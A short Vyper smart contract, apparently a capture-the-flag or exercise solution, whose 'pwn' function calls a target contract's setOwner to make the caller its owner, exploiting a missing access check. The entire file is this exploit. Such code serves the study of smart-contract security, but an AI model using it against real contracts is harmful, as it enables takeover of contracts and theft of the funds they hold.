#pragma version 0.4.0

interface Target:
    def setOwner(owner: address): nonpayable

target: public(Target)

@deploy
def __init__(target: address):
    self.target = Target(target)

@external
def pwn():
    extcall self.target.setOwner(msg.sender)
    pass